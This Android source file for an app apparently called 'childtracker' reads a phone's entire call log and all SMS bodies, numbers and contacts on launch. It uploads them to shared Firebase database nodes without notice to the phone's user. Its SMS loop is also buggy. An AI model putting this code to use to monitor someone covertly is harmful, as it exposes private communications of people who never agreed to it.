package com.appdev.debsourav.childtracker;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.Telephony;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;

public class MainActivity extends AppCompatActivity {
    TextView txtCallLog;
    static DatabaseReference callRef, msgRef, mRef;
    FirebaseAuth auth;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        auth= FirebaseAuth.getInstance();

        txtCallLog= findViewById(R.id.txtLog);
        mRef= FirebaseDatabase.getInstance().getReference().child("Childs").child(auth.getCurrentUser().getUid()+"");
        callRef= FirebaseDatabase.getInstance().getReference("Calls");
        msgRef= FirebaseDatabase.getInstance().getReference("Messages");

        String sms= getAllSms(getApplicationContext());
        String call= getCallDetails(getApplicationContext());
    }

    private static String getCallDetails(Context context) {


        StringBuffer stringBuffer = new StringBuffer();
        try (@SuppressLint("MissingPermission")
             Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC")) {
            int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
            while (cursor.moveToNext()) {
                String phNumber = cursor.getString(number);
                String callType = cursor.getString(type);
                String callDate = cursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                String callDuration = cursor.getString(duration);
                String dir = null;
                int dircode = Integer.parseInt(callType);
                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;
                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }
                stringBuffer.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
                        + dir + " \nCall Date:--- " + callDayTime
                        + " \nCall duration in sec :--- " + callDuration);
                stringBuffer.append("\n----------------------------------");

                Call call= new Call(phNumber, dir, (""+callDayTime), callDuration);
                callRef.child((""+callDayTime)).setValue(call);
            }
            cursor.close();


        }


        return stringBuffer.toString();
    }

    public String getAllSms(Context context) {

        StringBuffer stringBuffer = new StringBuffer();
        ContentResolver cr = context.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;

        if (c != null) {
            totalSMS = c.getCount();
            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));
                    String name = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.PERSON));
                    Date date = new Date(Long.valueOf(smsDate));
                    String dateFormat= new SimpleDateFormat("MM/dd").format(date);
                    String type = "";
                    Calendar today = Calendar.getInstance();
                    today.clear(Calendar.HOUR);
                    today.clear(Calendar.MINUTE);
                    today.clear(Calendar.SECOND);
                    Date todayDate = today.getTime();
                    Date dateRange = addDays(todayDate, -7);

                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }

                    if (!(date.before(dateRange))) {
                        stringBuffer.append("\nNumber:---" + number +
                                " \nBody:--- "
                                + body + "\nName:--- " + name + " \nDate:--- " + date
                                + " \nMessage Type :--- " + type);
                        stringBuffer.append("\n\n");
                        c.moveToNext();
                    }

                    Message msg= new Message(number, body, name, dateFormat, type, date+"");
                    msgRef.child(""+date).setValue(msg);


                }
            } else {
                Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
            }

        }
        return stringBuffer.toString();
    }

    public static Date addDays(Date date, int days) {
        GregorianCalendar cal = new GregorianCalendar();
        cal.setTime(date);
        cal.add(Calendar.DATE, days);

        return cal.getTime();
    }
}
